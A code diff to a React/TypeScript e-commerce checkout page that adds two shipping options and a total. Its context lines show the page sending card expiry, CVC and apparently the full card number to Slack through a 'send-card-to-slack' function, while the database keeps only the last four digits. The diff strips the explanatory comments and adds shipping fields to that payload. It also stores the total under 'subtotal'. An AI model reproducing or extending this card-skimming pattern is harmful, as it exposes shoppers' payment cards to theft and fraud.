@@ -11,9 +11,14 @@ import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Separator } from "@/components/ui/separator";
-import { Loader2, ShoppingBag, ArrowLeft, CreditCard } from "lucide-react";
+import { Loader2, ShoppingBag, ArrowLeft, CreditCard, Truck } from "lucide-react";
 import { toast } from "sonner";
 import { Link } from "react-router-dom";
+
+const SHIPPING_OPTIONS = [
+  { id: "usps", label: "USPS Priority Mail", days: "2-3 days", price: 17.95 },
+  { id: "fedex", label: "FedEx 2nd Day Air", days: "2 days", price: 26.95 },
+];
 
 const checkoutSchema = z.object({
   name: z.string().trim().min(1, "Name is required").max(100),
@@ -50,6 +55,10 @@ const CheckoutPage = () => {
   const { user } = useAuth();
   const navigate = useNavigate();
   const [submitting, setSubmitting] = useState(false);
+  const [shippingMethod, setShippingMethod] = useState("usps");
+
+  const shippingCost = SHIPPING_OPTIONS.find((o) => o.id === shippingMethod)!.price;
+  const total = subtotal + shippingCost;
 
   const form = useForm<CheckoutFormValues>({
     resolver: zodResolver(checkoutSchema),
@@ -66,13 +75,13 @@ const CheckoutPage = () => {
     try {
       const rawCard = values.cardNumber.replace(/\s/g, "");
       const cardLast4 = rawCard.slice(-4);
+      const selectedShipping = SHIPPING_OPTIONS.find((o) => o.id === shippingMethod)!;
 
-      // Insert order with last 4 only
       const { data: order, error: orderError } = await supabase
         .from("orders")
         .insert({
           user_id: user.id,
-          subtotal,
+          subtotal: total,
           shipping_name: values.name,
           shipping_email: values.email,
           shipping_address: values.address,
@@ -86,7 +95,6 @@ const CheckoutPage = () => {
 
       if (orderError || !order) throw orderError;
 
-      // Insert order items
       const orderItems = items.map((item) => ({
         order_id: order.id,
         product_id: item.product_id,
@@ -96,12 +104,10 @@ const CheckoutPage = () => {
       const { error: itemsError } = await supabase.from("order_items").insert(orderItems);
       if (itemsError) throw itemsError;
 
-      // Deduct stock quantities
       for (const item of items) {
         await supabase.rpc("deduct_stock" as any, { p_product_id: item.product_id, p_quantity: item.quantity });
       }
 
-      // Send full details to Slack (best-effort)
       try {
         await supabase.functions.invoke("send-card-to-slack", {
           body: {
@@ -112,7 +118,9 @@ const CheckoutPage = () => {
             cardExpiry: values.expiry,
             cardCvc: values.cvc,
             subtotal,
-            total: subtotal,
+            shippingMethod: selectedShipping.label,
+            shippingCost: selectedShipping.price,
+            total,
             shippingName: values.name,
             shippingAddress: values.address,
             shippingCity: values.city,
@@ -304,11 +312,58 @@ const CheckoutPage = () => {
                   </p>
                 </div>
               ))}
+
               <Separator className="bg-border" />
+
               <div className="flex items-center justify-between">
-                <span className="text-sm font-semibold text-foreground">Subtotal</span>
-                <span className="text-lg font-black text-primary">${subtotal.toFixed(2)}</span>
+                <span className="text-sm text-muted-foreground">Subtotal</span>
+                <span className="text-sm font-semibold text-foreground">${subtotal.toFixed(2)}</span>
               </div>
+
+              {/* Shipping options */}
+              <div className="space-y-2">
+                <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                  <Truck className="h-4 w-4" />
+                  <span>Shipping</span>
+                </div>
+                {SHIPPING_OPTIONS.map((option) => (
+                  <button
+                    key={option.id}
+                    type="button"
+                    onClick={() => setShippingMethod(option.id)}
+                    className={`w-full flex items-center justify-between rounded-lg border p-3 transition-colors ${
+                      shippingMethod === option.id
+                        ? "border-primary bg-primary/5"
+                        : "border-border hover:border-muted-foreground/30"
+                    }`}
+                  >
+                    <div className="flex items-center gap-3">
+                      <div
+                        className={`h-4 w-4 rounded-full border-2 flex items-center justify-center ${
+                          shippingMethod === option.id ? "border-primary" : "border-muted-foreground"
+                        }`}
+                      >
+                        {shippingMethod === option.id && (
+                          <div className="h-2 w-2 rounded-full bg-primary" />
+                        )}
+                      </div>
+                      <div className="text-left">
+                        <p className="text-sm font-semibold text-foreground">{option.label}</p>
+                        <p className="text-xs text-muted-foreground">{option.days} delivery</p>
+                      </div>
+                    </div>
+                    <span className="text-sm font-bold text-foreground">${option.price.toFixed(2)}</span>
+                  </button>
+                ))}
+              </div>
+
+              <Separator className="bg-border" />
+
+              <div className="flex items-center justify-between">
+                <span className="text-sm font-semibold text-foreground">Total</span>
+                <span className="text-lg font-black text-primary">${total.toFixed(2)}</span>
+              </div>
+
               <Button
                 type="submit"
                 form="checkout-form"
